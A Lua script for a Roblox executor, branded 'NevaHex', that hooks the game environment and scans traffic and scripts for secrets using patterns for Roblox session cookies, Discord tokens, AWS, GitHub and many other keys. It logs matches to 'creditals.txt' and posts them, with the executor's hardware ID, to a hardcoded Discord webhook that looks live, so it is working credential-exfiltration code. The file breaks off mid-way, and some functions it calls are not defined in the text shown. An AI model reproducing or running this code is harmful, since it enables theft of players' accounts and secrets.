--!nocheck
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1551429335976517733/bvxOhXM8GTOChcfbO6P9uKnZCgtPy5CSHFFlu3Dwe-GU0831GtxvGbfGlRGAbSCdQQKh"
local EXTRA_WEBHOOKS = {}
local CUSTOM_FOOTER = "NevaHex | logged by NevaHex"
local CREDS_FILENAME_DISCORD = "creditals.txt"
local ENVLOG_FILENAME_DISCORD = "envlogged.txt"
local EMBED_COLOR = 16711680
local ALERT_COLOR = 16776960
local SESSION_ID = tostring(math.random(100000, 999999)) .. tostring(os.time())

local CONFIG = {
    max_entries=32768, flush_interval=0.4, stack_depth=6,
    log_to_file=true, creds_path="creditals.txt", envlog_path="envlogged.txt",
    replay_path="_replay.bin", replay_max=500, envlog_rotate_bytes=8*1024*1024,
    trace_reads=true, trace_writes=true, trace_calls=true, trace_env=true, trace_load=true,
    trace_require=true, trace_remote=true, trace_signals=true, trace_coroutine=true, trace_task=true,
    trace_rawnet=true, trace_instance=true, trace_http=true, trace_file_io=true, trace_debug=true,
    trace_closure=true, trace_player=true, trace_chat=true, trace_humanoid=true, trace_signatures=true,
    profiler_enabled=true, call_graph_enabled=true, taint_enabled=true,
    env_diff_enabled=true, env_diff_interval=2.0, rate_limit_per_s=60,
    secret_enabled=true, secret_dedupe=true, secret_min_b64_len=200, secret_min_hex_len=64,
    secret_scan_kinds={http=true, remote=true, file=true, invoke=true, load=true, require=true, chat=true, watch=true, manual=true, sig=true},
    silence_sources={"nevahex_envlog"},
    webhook_min_gap=2.1, envlog_send_gap=10.0, envlog_batch_max=200,
    webhook_retry_max=3, webhook_retry_wait=1.5,
    heartbeat_seconds=300, integrity_seconds=5,
    recon_on_load=true, player_tracking=true, chat_capture=true, anti_kick=true, script_attribution=true,
    auto_character_hooks=true, auto_descendant_spy=true, auto_drawing_spy=true, auto_gui_detector=true,
    auto_uis_input=true, auto_cas_spy=true, auto_datastore_spy=true, auto_marketplace_spy=true,
    auto_teleport_spy=true, auto_runservice_spy=true, auto_sound_spy=true, auto_animation_spy=true,
    auto_camera_spy=true, auto_lighting_spy=true, auto_clipboard_spy=true, auto_teleport_queue_spy=true,
    auto_custom_asset_spy=true, auto_network_stats=true, auto_fps_counter=true, auto_error_capture=true,
    auto_attribute_spy=true, auto_hook_sweep=true, auto_known_bad_scan=true, auto_env_snapshot=true,
    descendant_class_filter=nil,
    descendant_ignore_classes={Folder=true,Configuration=true,NumberValue=true,StringValue=true,BoolValue=true,IntValue=true,ObjectValue=true,Vector3Value=true,CFrameValue=true,Color3Value=true,RayValue=true,BrickColorValue=true},
    fps_sample_interval=1.0, network_sample_interval=5.0,
    decompile_on_critical=true, decompile_max_bytes=200000,
    http_decode_enabled=true, cross_script_correlation=true,
    -- v8 new
    instruction_trace=true, string_const_diff=true, upvalue_chain=true,
    http_fingerprint=true, autodecode_chain=true, autotaint=true,
    c_api_trace=true, ancestry_hash=true, memory_watch=true, console_capture=true,
    exec_fingerprint=true, remote_schema=true, self_beacon=true,
    cross_instance=true, timing_detect=true, regex_snapshot=true,
    decoy_injection=false, rotation_tracker=true, heap_sampler=true,
    replay_buffer=true, sig_of_day=true, weighted_scoring=true,
    locale_detect=true, suspend_guard=true,
    gzip_decode=true, xor_brute=true, luac_detect=true, unicode_confusable=true,
    weighted_window=60, weighted_threshold=25, alert_color=16776960,
    taint_strings_max=10000, beacon_on_stop=true,
}

local CAP={}
local function probe()
    local names={"getrawmetatable","setreadonly","isreadonly","hookfunction","restorefunction","hookmetamethod","getnamecallmethod","newcclosure","iscclosure","islclosure","clonefunction","checkcaller","getgenv","getrenv","getreg","getgc","getinstances","getnilinstances","getloadedmodules","getscripts","getsenv","getcallingscript","getscriptbytecode","decompile","dump_function","getupvalue","setupvalue","getupvalues","getconstants","getprotos","getinfo","getstack","readfile","writefile","appendfile","listfiles","delfile","isfile","isfolder","makefolder","writepipe","readpipe","request","http_request","httpget","httppost","HttpGet","HttpPost","syn","getconnections","firesignal","fireclickdetector","firetouchinterest","fireproximityprompt","getcustomasset","gethui","setclipboard","queue_on_teleport","identifyexecutor","gethwid","Drawing","setattribute","getattribute","setattributes","readmemory","writememory","zlib","buffer","getcallbackvalue","getcallbackmember"}
    local env=getgenv and getgenv() or _G
    for _,n in ipairs(names) do CAP[n]=env[n]~=nil end
end

local reentry=0
local function entering() reentry=reentry+1 end
local function leaving() reentry=reentry-1 end
local function in_reentry() return reentry>0 end

local SEQ=0
local function next_seq() SEQ=SEQ+1; return SEQ end
local t0=os.clock()
local function mono() return os.clock()-t0 end

local function caller_info(skip)
    skip=skip or 2
    local frames={}
    for lvl=skip,skip+CONFIG.stack_depth do
        local s,l,n=debug.info(lvl,"sln")
        if not s then break end
        local drop=false
        for _,pat in ipairs(CONFIG.silence_sources) do
            if s:find(pat,1,true) then drop=true; break end
        end
        if not drop then frames[#frames+1]={src=s,line=l or 0,fn=n or "?"} end
    end
    local top=frames[1] or {src="?",line=0,fn="?"}
    return top.src,top.line,top.fn,frames
end

local function fmt_ident(x)
    local t=typeof(x)
    if t=="Instance" then
        local ok,f=pcall(function() return x:GetFullName() end)
        return ok and f or ("Instance<"..tostring(x)..">")
    elseif t=="string" then return string.format("%q",x:sub(1,96)) end
    return tostring(x)
end

local function fmt_val(x,depth)
    depth=depth or 0
    local t=typeof(x)
    if t=="function" then
        local src="?"; pcall(function() src=debug.info(x,"s") or "?" end)
        return "<fn "..src..">"
    elseif t=="table" then
        if depth>0 then return "<table>" end
        return "<table "..tostring(x)..">"
    elseif t=="string" then
        return #x>200 and (string.format("%q",x:sub(1,200)).."...") or string.format("%q",x)
    elseif t=="Instance" then return fmt_ident(x)
    elseif t=="userdata" then return "<udata "..tostring(x)..">"
    elseif t=="thread" then return "<thread "..tostring(x)..">" end
    return tostring(x)
end

local function fmt_args(packed)
    if not packed or packed.n==0 then return "()" end
    local cap=math.min(packed.n,8)
    local parts=table.create(cap)
    for i=1,cap do parts[i]=fmt_val(packed[i],1) end
    if packed.n>cap then parts[#parts+1]="..."..(packed.n-cap) end
    return "("..table.concat(parts,", ")..")"
end

local function json_escape(s)
    s=tostring(s)
    return (s:gsub('[%c"\\]',function(c)
        if c=='"' then return '\\"' end
        if c=='\\' then return '\\\\' end
        if c=='\n' then return '\\n' end
        if c=='\r' then return '\\r' end
        if c=='\t' then return '\\t' end
        return string.format('\\u%04x',c:byte())
    end))
end

local function simple_hash(s)
    local h=5381
    for i=1,#s do h=((h*33)+s:byte(i))%4294967296 end
    return string.format("%08x",h)
end

local filters={allow_source={},deny_source={},deny_key={},deny_target={},deny_kind={}}
local function passes_filters(kind,src,target,key)
    for _,p in ipairs(filters.deny_kind) do if kind==p then return false end end
    if #filters.allow_source>0 then
        local ok=false
        for _,p in ipairs(filters.allow_source) do if src and src:find(p,1,true) then ok=true; break end end
        if not ok then return false end
    end
    for _,p in ipairs(filters.deny_source) do if src and src:find(p,1,true) then return false end end
    if key~=nil then
        local ks=tostring(key)
        for _,p in ipairs(filters.deny_key) do if ks:find(p,1,true) then return false end end
    end
    if target~=nil then
        local tn=fmt_ident(target)
        for _,p in ipairs(filters.deny_target) do if tn:find(p,1,true) then return false end end
    end
    return true
end

local rate_buckets={}
local function rate_ok(src,key)
    local now=mono()
    local b=src.."|"..tostring(key or "?")
    local r=rate_buckets[b]
    if not r or now-r.start>=1 then rate_buckets[b]={start=now,n=1}; return true end
    r.n=r.n+1
    return r.n<=CONFIG.rate_limit_per_s
end

local entries={}
local head,tail,count=1,0,0
local replay={}
local replay_idx=1

local function raw_push(kind,data)
    tail=tail+1
    if tail>CONFIG.max_entries then tail=1 end
    local rec={seq=next_seq(),t=mono(),kind=kind,data=data}
    entries[tail]=rec
    if count<CONFIG.max_entries then count=count+1
    else head=head+1; if head>CONFIG.max_entries then head=1 end end
    if CONFIG.replay_buffer then
        replay[replay_idx]={kind=kind,data=data,t=rec.t}
        replay_idx=replay_idx+1
        if replay_idx>CONFIG.replay_max then replay_idx=1 end
    end
end

local function push(kind,data)
    if in_reentry() then return end
    if data.src and not passes_filters(kind,data.src,data.target,data.key) then return end
    if data.src and not rate_ok(data.src,data.key or data.method or data.op) then return end
    raw_push(kind,data)
end

local call_graph={}
local profile={}
local taint=setmetatable({},{__mode="k"})
local taint_strings={}
local taint_string_count=0

-- ============================================================
-- PATTERNS
-- ============================================================
local PATTERNS={
    {name="discord_webhook",re="https?://[%w%-%.]*discord[%w%-%.]*%.com/api/webhooks/%d+/[%w%-_]+",sev="CRIT"},
    {name="discord_bot_token",re="[MN][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d][A-Za-z%d]%.[%w%-_]+%.[%w%-_]+",sev="CRIT"},
    {name="roblox_cookie",re="_|WARNING:%-DO%-NOT%-SHARE%-THIS[%w%-_%./=]+",sev="CRIT"},
    {name="roblox_cookie_alt",re="%.ROBLOSECURITY=([%w%-_%./=]+)",sev="CRIT"},
    {name="bearer_token",re="[Bb]earer%s+[A-Za-z%d%-%._~+/]+=*",sev="HIGH"},
    {name="jwt",re="eyJ[A-Za-z%d_%-]+%.eyJ[A-Za-z%d_%-]+%.[A-Za-z%d_%-]+",sev="HIGH"},
    {name="aws_access_key",re="AKIA[0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z]",sev="CRIT"},
    {name="aws_secret",re="aws[_%-]?secret[_%-]?access[_%-]?key[\"'%s:=]+([A-Za-z0-9/+=]+)",sev="CRIT"},
    {name="aws_session",re="ASIA[0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z][0-9A-Z]",sev="HIGH"},
    {name="github_pat_new",re="github_pat_[A-Za-z0-9_]+",sev="CRIT"},
    {name="github_pat",re="gh[pousr]_[A-Za-z0-9]+",sev="CRIT"},
    {name="slack_token",re="xox[baprs]%-[A-Za-z0-9%-]+",sev="HIGH"},
    {name="google_api_key",re="AIza[0-9A-Za-z_%-]+",sev="HIGH"},
    {name="openai_key",re="sk%-[A-Za-z0-9]+",sev="HIGH"},
    {name="stripe_live",re="sk_live_[0-9a-zA-Z]+",sev="CRIT"},
    {name="telegram_bot",re="%d%d%d%d%d%d%d%d%d?:[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="private_key",re="%-%-%-%-%-BEGIN%s+[A-Z]*%s*PRIVATE%s+KEY%-%-%-%-%-",sev="CRIT"},
    {name="generic_api_key",re="[Aa][Pp][Ii][_%-]?[Kk][Ee][Yy][\"'%s:=]+([A-Za-z0-9_%-]+)",sev="MED"},
    {name="generic_token",re="[Tt][Oo][Kk][Ee][Nn][\"'%s:=]+([A-Za-z0-9_%./+%-]+)",sev="MED"},
    {name="generic_secret",re="[Ss][Ee][Cc][Rr][Ee][Tt][\"'%s:=]+([A-Za-z0-9_%./+%-]+)",sev="MED"},
    {name="generic_password",re="[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd][\"'%s:=]+([^\"'%s]+)",sev="HIGH"},
    {name="basic_auth_url",re="https?://[^%s:/@]+:[^%s:/@]+@[^%s/]+",sev="CRIT"},
    {name="webhook_generic",re="https?://[%w%-%.]+/api/webhooks?/[%w%-_/]+",sev="HIGH"},
    {name="url_with_token",re="https?://[^%s\"'<>]+[?&](token|key|apikey|api_key|access_token|auth)=",sev="HIGH"},
    {name="azure_storage_key",re="[Aa]ccount[Kk]ey=[A-Za-z0-9+/=]+",sev="CRIT"},
    {name="azure_sas",re="sig=[A-Za-z0-9%+/=]+&",sev="HIGH"},
    {name="gcp_service_json",re="\"type\":\"service_account\"",sev="CRIT"},
    {name="gcp_oauth",re="ya29%.[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="vercel_token",re="vercel_[A-Za-z0-9]+",sev="HIGH"},
    {name="netlify_token",re="nfp_[A-Za-z0-9]+",sev="HIGH"},
    {name="cloudflare_token",re="cf%-[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="npm_token",re="npm_[A-Za-z0-9]+",sev="HIGH"},
    {name="pypi_token",re="pypi%-[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="digitalocean_pat",re="dop_v1_[a-f0-9]+",sev="CRIT"},
    {name="sendgrid_key",re="SG%.[A-Za-z0-9_%-]+%.[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="linear_api",re="lin_api_[A-Za-z0-9]+",sev="HIGH"},
    {name="notion_token",re="secret_[A-Za-z0-9]+",sev="HIGH"},
    {name="shopify_token",re="shpat_[A-Za-z0-9]+",sev="HIGH"},
    {name="zapier_hook",re="https?://hooks%.zapier%.com/hooks/catch/%d+/[A-Za-z0-9]+/",sev="HIGH"},
    {name="ifttt_key",re="https?://maker%.ifttt%.com/use/[A-Za-z0-9_%-]+/with/key/[A-Za-z0-9_%-]+",sev="HIGH"},
    {name="firebase_url",re="https?://[A-Za-z0-9%-]+%.firebaseio%.com",sev="MED"},
    {name="supabase_key",re="eyJ[A-Za-z0-9_%-]+%.[A-Za-z0-9_%-]+%.[A-Za-z0-9_%-]+",sev="MED"},
}

local SECRETS={seen={},hits=0}

-- ============================================================
-- FILE HANDLES + QUEUES
-- ============================================================
local creds_handle
do local ok,f=pcall(io.open,CONFIG.creds_path,"a"); if ok and f then creds_handle=f end end

local envlog_handle,envlog_bytes
local function open_envlog()
    local ok,f=pcall(io.open,CONFIG.envlog_path,"a")
    if ok and f then envlog_handle=f; local sz=f:seek("end"); envlog_bytes=sz or 0 end
end
open_envlog()

local creds_queue={}
local envlog_queue={}
local last_creds_send=0
local last_envlog_send=0
local webhook_rotor=0

-- ============================================================
-- HTTP
-- ============================================================
local function http_request_fn()
    local env=getgenv and getgenv() or _G
    return (env.syn and env.syn.request) or env.http_request or env.request
        or (syn and syn.request) or http_request or request
end

local function get_webhooks()
    local list={}
    if DISCORD_WEBHOOK and DISCORD_WEBHOOK~="" then list[#list+1]=DISCORD_WEBHOOK end
    for _,w in ipairs(EXTRA_WEBHOOKS) do if type(w)=="string" and w~="" then list[#list+1]=w end end
    return list
end

local function next_webhook()
    local list=get_webhooks()
    if #list==0 then return nil end
    webhook_rotor=webhook_rotor+1
    return list[((webhook_rotor-1)%#list)+1]
end

local function http_post_raw(url,body,ct)
    local req=http_request_fn()
    if not req then return false,"no http function" end
    local ok,res=pcall(req,{Url=url,Method="POST",Headers={["Content-Type"]=ct},Body=body})
    if not ok then return false,tostring(res) end
    if type(res)=="table" then
        local code=res.StatusCode or res.status or res.Status
        if code and (code<200 or code>=300) then
            return false,string.format("HTTP %s %s",tostring(code),tostring(res.Body or res.body or ""))
        end
    end
    return true,nil
end

local function post_multipart_file(payload_json,filename,file_content)
    local url=next_webhook()
    if not url then return false,"no webhook configured" end
    local boundary="----nevahex"..tostring(math.random(100000000,999999999))..tostring(math.floor(os.clock()*1000))
    local crlf="\r\n"
    local parts={}
    parts[#parts+1]="--"..boundary..crlf
    parts[#parts+1]='Content-Disposition: form-data; name="payload_json"'..crlf
    parts[#parts+1]="Content-Type: application/json"..crlf
    parts[#parts+1]=crlf
    parts[#parts+1]=payload_json..crlf
    parts[#parts+1]="--"..boundary..crlf
    parts[#parts+1]='Content-Disposition: form-data; name="files[0]"; filename="'..filename..'"'..crlf
    parts[#parts+1]="Content-Type: text/plain"..crlf
    parts[#parts+1]=crlf
    parts[#parts+1]=file_content..crlf
    parts[#parts+1]="--"..boundary.."--"..crlf
    local body=table.concat(parts)
    local ct="multipart/form-data; boundary="..boundary
    local attempt=0
    while attempt<CONFIG.webhook_retry_max do
        attempt=attempt+1
        local ok,err=http_post_raw(url,body,ct)
        if ok then return true,nil end
        if err and (err:find("429") or err:find("5%d%d")) then task.wait(CONFIG.webhook_retry_wait*attempt)
        else return false,err end
    end
    return false,"retry exhausted"
end

local function post_json_with_retry(body)
    local url=next_webhook()
    if not url then return false,"no webhook configured" end
    local attempt=0
    while attempt<CONFIG.webhook_retry_max do
        attempt=attempt+1
        local ok,err=http_post_raw(url,body,"application/json")
        if ok then return true,nil end
        if err and (err:find("429") or err:find("5%d%d")) then task.wait(CONFIG.webhook_retry_wait*attempt)
        else return false,err end
    end
    return false,"retry exhausted"
end

local SEV_RANK={CRIT=4,HIGH=3,MED=2,LOW=1,INFO=0}
local function worst_sev(batch)
    local w="LOW"
    for _,s in ipairs(batch) do if (SEV_RANK[s.sev] or 0)>(SEV_RANK[w] or 0) then w=s.sev end end
    return w
end

local function count_patterns(batch)
    local by={}
    for _,s in ipairs(batch) do local k=s.pattern or "?"; by[k]=(by[k] or 0)+1 end
    local list={}
    for k,v in pairs(by) do list[#list+1]={k=k,v=v} end
    table.sort(list,function(a,b) return a.v>b.v end)
    local top={}
    for i=1,math.min(5,#list) do top[#top+1]=string.format("%s (%d)",list[i].k,list[i].v) end
    return table.concat(top,", ")
end

-- ============================================================
-- AUTO-DECODE CHAIN (feature 5,24 + luac detect)
-- ============================================================
local function url_decode(s) return (s:gsub("%%(%x%x)",function(h) return string.char(tonumber(h,16)) end)) end
local function hex_decode(s) if #s%2~=0 then return s end return (s:gsub("%x%x",function(h) return string.char(tonumber(h,16)) end)) end
local function b64_decode(s)
    local b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    s=s:gsub("[^"..b:gsub("%-","%%-").."=]","")
    local out={}; local i=1
    while i<=#s do
        local c1=b:find(s:sub(i,i),1,true) or 0
        local c2=b:find(s:sub(i+1,i+1),1,true) or 0
        local c3=b:find(s:sub(i+2,i+2),1,true) or 0
        local c4=b:find(s:sub(i+3,i+3),1,true) or 0
        local n=c1*262144+c2*4096+c3*64+c4
        out[#out+1]=string.char(math.floor(n/65536)%256)
        out[#out+1]=string.char(math.floor(n/256)%256)
        out[#out+1]=string.char(n%256)
        i=i+4
    end
    return table.concat(out)
end
local function rot13(s)
    return (s:gsub("%a",function(c)
        local b=c:byte()
        if b>=65 and b<=90 then return string.char(((b-65+13)%26)+65) end
        if b>=97 and b<=122 then return string.char(((b-97+13)%26)+97) end
        return c
    end))
end
local function xor_single(s,key)
    local out={}
    for i=1,#s do out[i]=string.char(bit32.bxor(s:byte(i),key)) end
    return table.concat(out)
end
local function detect_luac(s)
    if #s>=4 and s:byte(1)==27 and s:sub(2,4)=="Lua" then return s:byte(5) end
    return nil
end
local CONFUSABLES={
    ["\208\176"]="a",["\208\181"]="e",["\208\190"]="o",["\209\128"]="p",["\209\129"]="c",["\209\133"]="x",
    ["\208\144"]="A",["\208\149"]="E",["\208\158"]="O",["\208\160"]="P",["\208\161"]="C",["\208\165"]="X",
}
local function has_confusable(s)
    for k,_ in pairs(CONFUSABLES) do if s:find(k,1,true) then return true end end
    return false
end

local function scan_decoded(body,ctx)
    if not CONFIG.http_decode_enabled then return end
    if type(body)~="string" then return end
    local tried={}
    local function try(s) if s and not tried[s] then tried[s]=true; scan_string(s,ctx) end end
    if body:match("^[A-Za-z0-9+/=]+$") and #body>16 then
        local ok,d=pcall(b64_decode,body); if ok and d and d:match("%g") then try(d) end
    end
    if body:find("%%[0-9A-Fa-f][0-9A-Fa-f]") then try(url_decode(body)) end
    if body:match("^[0-9a-fA-F]+$") and #body%2==0 then
        local ok,d=pcall(hex_decode,body); if ok and d and d:match("%g") then try(d) end
    end
    if CONFIG.gzip_decode and CAP.zlib and getgenv().zlib and getgenv().zlib.decompress then
        local ok,d=pcall(getgenv().zlib.decompress,body); if ok and d then try(d) end
    end
    if CONFIG.xor_brute and #body<5000 then
        for key=1,255 do
            local ok,d=pcall(xor_single,body,key)
            if ok and d and (d:match("https?://") or d:match("eyJ")) then try(d); break end
        end
    end
    try(rot13(body))
    if CONFIG.luac_detect then
        local v=detect_luac(body)
        if v then
            raw_push("luac",{op="bytecode",luac_version=v,size=#body,src=ctx.src or "?"})
        end
    end
end

-- ============================================================
-- WEIGHTED EVENT SCORE (feature 25)
-- ============================================================
local score_window={}
local function score_event(kind,sev)
    if not CONFIG.weighted_scoring then return end
    local now=mono()
    local base={secret=10,remote=2,http=5,file=5,closure=8,debug=3,known_bad=15,sig=4}
    local s=(base[kind] or 1)*((SEV_RANK[sev] or 1)+1)
    score_window[#score_window+1]={t=now,score=s}
    local cut=now-CONFIG.weighted_window
    while #score_window>0 and score_window[1].t<cut do table.remove(score_window,1) end
    local sum=0
    for _,e in ipairs(score_window) do sum=sum+e.score end
    if sum>=CONFIG.weighted_threshold then
        send_embed("Critical Activity",{
            {name="Weighted Score",value=tostring(sum),inline=true},
            {name="Window",value=CONFIG.weighted_window.."s",inline=true},
            {name="Session",value=SESSION_ID,inline=true},
        },"weighted threshold exceeded",CONFIG.alert_color)
        score_window={}
    end
end

-- ============================================================
-- FEATURE 4: HTTP FINGERPRINT STORE
-- ============================================================
local http_fingerprints={}
local function fingerprint_http(url,body,ctx)
    if not CONFIG.http_fingerprint then return end
    local h=simple_hash((url or "?").."|"..tostring(body or ""))
    local prev=http_fingerprints[h]
    if not prev then
        http_fingerprints[h]={url=url,body_len=#tostring(body or ""),count=1,first=mono()}
    else
        prev.count=prev.count+1
        if prev.url~=url then
            raw_push("fingerprint",{op="url_rotated",old=prev.url,new=url,count=prev.count,src=ctx.src or "?"})
        end
    end
end

-- ============================================================
-- FEATURE 18: ROTATION TRACKER
-- ============================================================
local cred_lineage={}
local function track_lineage(pattern,value,src)
    if not CONFIG.rotation_tracker then return end
    local key=pattern.."|"..simple_hash(value)
    if not cred_lineage[key] then cred_lineage[key]={srcs={},count=0}
    end
    local L=cred_lineage[key]
    L.count=L.count+1
    if src then L.srcs[src]=(L.srcs[src] or 0)+1 end
    local distinct=0
    for _ in pairs(L.srcs) do distinct=distinct+1 end
    if distinct>=2 then
        raw_push("lineage",{op="shared_cred",pattern=pattern,distinct_srcs=distinct,count=L.count})
    end
end

-- ============================================================
-- FEATURE 12: REMOTE SCHEMA LEARNING
-- ============================================================
local remote_schemas={}
local function learn_remote(target,method,args)
    if not CONFIG.remote_schema then return end
    local key=fmt_ident(target)..":"..method
    local sig={}
    for i=1,math.min(args.n or 0,6) do
        local t=type(args[i])
        if t=="table" and typeof(args[i])=="Instance" then t="Instance" end
        sig[#sig+1]=t
    end
    local sigstr=table.concat(sig,",")
    local s=remote_schemas[key]
    if not s then
        remote_schemas[key]={base=sigstr,count=1,anomalies=0}
    else
        s.count=s.count+1
        if s.count>20 and s.base~=sigstr then
            s.anomalies=s.anomalies+1
            raw_push("schema",{op="remote_anomaly",remote=key,expected=s.base,got=sigstr,count=s.count})
        end
    end
end

-- ============================================================
-- FEATURE 2: STRING CONST DIFF PER SCRIPT
-- ============================================================
local script_consts={}
local function scan_script_constants(scr)
    if not CONFIG.string_const_diff then return end
    if not debug.getconstants then return end
    pcall(function()
        local fn=scr
        local consts=debug.getconstants(fn)
        if not consts then return end
        local keep={}
        for _,c in ipairs(consts) do
            if type(c)=="string" then
                for _,p in ipairs(PATTERNS) do
                    if c:match(p.re) then
                        raw_push("const",{op="cred_in_constants",pattern=p.name,value=c:sub(1,120),script=scr.Name or "?",sev=p.sev})
                        break
                    end
                end
            end
        end
        script_consts[scr]={n=#consts,t=mono()}
    end)
end

-- ============================================================
-- FEATURE 3: UPVALUE CHAIN TRACER
-- ============================================================
local function upvalue_chain(fn)
    if not CONFIG.upvalue_chain then return nil end
    if type(fn)~="function" then return nil end
    local chain={}
    if debug.getupvalues then
        local ok,ups=pcall(debug.getupvalues,fn)
        if ok and ups then
            for i,v in ipairs(ups) do
                chain[#chain+1]={i=i,type=typeof(v),val=fmt_val(v,1)}
            end
        end
    end
    return chain
end

-- ============================================================
-- FEATURE 1: INSTRUCTION TRACE
-- ============================================================
local function instruction_summary(fn)
    if not CONFIG.instruction_trace then return nil end
    if type(fn)~="function" then return nil end
    local info={source=debug.info(fn,"s"),line=debug.info(fn,"l")}
    if debug.getconstants then
        local ok,c=pcall(debug.getconstants,fn)
        if ok and c then info.const_count=#c end
    end
    if debug.getprotos then
        local ok,p=pcall(debug.getprotos,fn)
        if ok and p then info.proto_count=#p end
    end
    if debug.getupvalues then
        local ok,u=pcall(debug.getupvalues,fn)
        if ok and u then info.upvalue_count=#u end
    end
    return info
end

-- ============================================================
-- FEATURE 8: INSTANCE ANCESTRY HASH
-- ============================================================
local ancestry_hist={}
local function ancestry_hash(inst)
    if not CONFIG.ancestry_hash then return end
    pcall(function()
        local name=inst:GetFullName().."/"..inst.ClassName
        local h=simple_hash(name)
        local now=mono()
        ancestry_hist[h]=ancestry_hist[h] or {n=0,first=now}
        ancestry_hist[h].n=ancestry_hist[h].n+1
        if ancestry_hist[h].n==3 then
            raw_push("ancestry",{op="repeat_creation",hash=h,name=name})
        end
    end)
end

-- ============================================================
-- FEATURE 15: TIMING SIDE-CHANNEL
-- ============================================================
local cred_times={}
local function timing_check()
    if not CONFIG.timing_detect or #cred_times<3 then return end
    local deltas={}
    for i=2,#cred_times do deltas[#deltas+1]=cred_times[i]-cred_times[i-1] end
    local sum=0
    for _,d in ipairs(deltas) do sum=sum+d end
    local avg=sum/#deltas
    local consistent=true
    for _,d in ipairs(deltas) do if math.abs(d-avg)>0.5 then consistent=false; break end end
    if consistent and avg>0.3 and avg<5 then
        raw_push("timing",{op="automated_loop",avg_delta=avg,count=#cred_times})
    end
end

-- ============================================================
-- FEATURE 16: REGEX-TRIGGERED SNAPSHOT
-- ============================================================
local last_snapshot_t=0
local function regex_snapshot(trigger)
    if not CONFIG.regex_snapshot then return end
    if mono()-last_snapshot_t<30 then return end
    last_snapshot_t=mono()
    pcall(function()
        local env=getgenv and getgenv() or _G
        local n=0
        for _ in pairs(env) do n=n+1 end
        raw_push("snapshot",{op="triggered",trigger=trigger,global_keys=n})
    end)
end

-- ============================================================
-- FEATURE 17: DECOY INJECTION
-- ============================================================
local function should_decoy(pattern_name)
    if not CONFIG.decoy_injection then return false end
    return pattern_name=="roblox_cookie" or pattern_name=="roblox_cookie_alt"
end
local function decoy_value(pattern_name)
    return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|DECOY_NEVAHEX_"..SESSION_ID
end

-- ============================================================
-- FEATURE 9: MEMORY WATCH
-- ============================================================
local function install_memory_watch()
    if not CONFIG.memory_watch then return end
    if not (CAP.readmemory and CAP.writememory) then return end
    task.spawn(function()
        local last_ctx=0
        while true do
            task.wait(3)
            pcall(function()
                local sc=game:GetService("ScriptContext")
                local addr=tostring(sc)
                raw_push("memwatch",{op="addr_sample",target="ScriptContext",addr=addr})
            end)
        end
    end)
end

-- ============================================================
-- FEATURE 10: CONSOLE COMMAND CAPTURE
-- ============================================================
local load_counts={manual=0,script=0}
-- done in the loadstring hook itself

-- ============================================================
-- FEATURE 11: EXECUTOR FINGERPRINT
-- ============================================================
local exec_fp=nil
local function capture_executor_fingerprint()
    if not CONFIG.exec_fingerprint then return end
    local env=getgenv and getgenv() or _G
    local name,ver="unknown",""
    if env.identifyexecutor then
        local ok,n,v=pcall(env.identifyexecutor)
        if ok then name=tostring(n); ver=tostring(v or "") end
    end
    local hwid=""
    if env.gethwid then local ok,h=pcall(env.gethwid); if ok then hwid=tostring(h) end end
    exec_fp={name=name,ver=ver,hwid=hwid,hash=simple_hash(name..ver..hwid)}
end

-- ============================================================
-- FEATURE 13: SELF-PROTECTION BEACON
-- ============================================================
local function send_beacon(reason)
    if not CONFIG.self_beacon then return end
    local last_events={}
    local n=0
    for i=1,20 do
        local idx=(replay_idx-1-i)%CONFIG.replay_max+1
        local r=replay[idx]
        if not r then break end
        n=n+1
        last_events[#last_events+1]=string.format("%s @%.2fs",r.kind,r.t or 0)
    end
    send_embed("Session End",{
        {name="Session",value=SESSION_ID,inline=true},
        {name="Reason",value=tostring(reason),inline=true},
        {name="Uptime",value=string.format("%.1fs",mono()),inline=true},
        {name="Secrets Found",value=tostring(SECRETS.hits),inline=true},
        {name="Last Events",value=table.concat(last_events,"\n"):sub(1,1000),inline=false},
    },"beacon",CONFIG.alert_color)
end

-- ============================================================
-- FEATURE 14: CROSS-INSTANCE ID
-- ============================================================
local function instance_tag()
    return SESSION_ID
end

-- ============================================================
-- FEATURE 19: HEAP SAMPLER
-- ============================================================
local function install_heap_sampler()
    if not CONFIG.heap_sampler then return end
    task.spawn(function()
        local last_fn=0
        while true do
            task.wait(30)
            pcall(function()
                if not getgc then return end
                local counts={}
                for _,obj in ipairs(getgc()) do
                    local t=typeof(obj); counts[t]=(counts[t] or 0)+1
                end
                local cur=counts["function"] or 0
                if last_fn>0 and cur-last_fn>500 then
                    raw_push("heap",{op="function_spike",prev=last_fn,now=cur,delta=cur-last_fn})
                end
                last_fn=cur
            end)
        end
    end)
end

-- ============================================================
-- FEATURE 20: REPLAY BUFFER TO DISK
-- ============================================================
local function persist_replay()
    if not CONFIG.replay_buffer then return end
    pcall(function()
        local f=io.open(CONFIG.replay_path,"w")
        if not f then return end
        for i=1,CONFIG.replay_max do
            local r=replay[i]
            if r then
                f:write(string.format("%.3f|%s|%s\n",r.t or 0,r.kind,simple_hash(fmt_val(r.data,2))))
            end
        end
        f:close()
    end)
end

-- ============================================================
